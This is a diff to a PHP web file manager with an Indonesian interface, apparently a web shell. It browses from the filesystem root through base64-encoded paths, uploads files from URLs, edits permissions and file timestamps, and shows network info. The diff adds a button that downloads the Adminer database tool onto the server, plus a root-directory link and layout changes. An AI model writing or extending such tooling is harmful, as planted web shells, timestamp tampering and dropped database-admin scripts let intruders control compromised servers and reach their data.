@@ -123,6 +123,12 @@ function uploadFromUrl($url, $saveTo) {
     echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
 }
 
+// Fungsi upload Adminer
+function uploadAdminer($saveTo) {
+    $adminerUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php';
+    uploadFromUrl($adminerUrl, $saveTo);
+}
+
 // Fungsi upload file dari form
 function uploadFromForm($file, $saveTo) {
     if (move_uploaded_file($file['tmp_name'], $saveTo)) {
@@ -153,10 +159,12 @@ function display_path_links($dir) {
         foreach ($folders as $folder) {
             $folderPath = $dir . '/' . $folder;
             $encodedPath = urlencode(base64_encode($folderPath));
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
-            echo "<a href='?dir=$encodedPath' class='btn btn-link'>$folder/</a>";
-            echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
-            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
+            $isRoot = $folderPath === '/';
+            $style = $isRoot ? "style='color:red;'" : "";
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
+            echo "<span class='col-4'>$folder/</span>";
+            echo "<span class='col-4 text-center'>" . get_permissions($folderPath) . "</span>";
+            echo "<span class='col-4 text-right'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
             echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
             echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$folder')\">Ubah Tanggal</button>";
@@ -223,10 +231,12 @@ function display_path_links($dir) {
         foreach ($files as $file) {
             $filePath = $dir . '/' . $file;
             $encodedPath = urlencode(base64_encode($filePath));
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
-            echo "<span>$file</span>";
-            echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
-            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
+            $isRoot = $filePath === '/';
+            $style = $isRoot ? "style='color:red;'" : "";
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
+            echo "<span class='col-4'>$file</span>";
+            echo "<span class='col-4 text-center'>" . get_permissions($filePath) . "</span>";
+            echo "<span class='col-4 text-right'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
             echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
             echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$file')\">Ubah Tanggal</button>";
@@ -490,6 +500,7 @@ function str2oct($str) {
     return intval(implode('', $oct), 8);
 }
 
+$rootDir = '/'; // Menggunakan root direktori sistem Linux
 $dir = isset($_GET['dir']) ? base64_decode(urldecode($_GET['dir'])) : '.';
 $displayDir = realpath($dir);
 
@@ -582,6 +593,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             </form>
             <button class="btn btn-primary" onclick="toggleInfoSites()">Informasi Web</button>
             <button class="btn btn-secondary" onclick="toggleNetworkInfo()">Network Info</button>
+            <button class="btn btn-success" onclick="showForm('uploadAdminer')">Upload Adminer</button>
         </div>
 
         <!-- Informasi Web -->
@@ -592,6 +604,18 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         <!-- Informasi Jaringan -->
         <div id="networkInfo" class="network-info">
             <?php displayNetworkInfo(); ?>
+        </div>
+
+        <!-- Upload Adminer -->
+        <div id="uploadAdminer" class="form-popup">
+            <form method="post" class="form-container">
+                <h4>Upload Adminer</h4>
+                <label for="adminerFile"><b>Nama File Adminer</b></label>
+                <input type="text" id="adminerFile" name="adminerFile" placeholder="adminer.php" required>
+                <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
+                <button type="submit" name="uploadAdminer" class="btn btn-primary">Upload</button>
+                <button type="button" class="btn btn-secondary" onclick="hideForm('uploadAdminer')">Batal</button>
+            </form>
         </div>
 
         <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
@@ -616,6 +640,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         <h2 class="mt-4">Daftar Direktori</h2>
         <div class="alert alert-info">
             <strong>Direktori Saat Ini:</strong> 
+            <a href="?dir=<?php echo urlencode(base64_encode($rootDir)); ?>" class="btn btn-link">Home</a> 
             <?php
             $currentPath = '/';
             echo "<a href='?dir=" . urlencode(base64_encode('/')) . "' class='btn btn-link'>/</a> ";
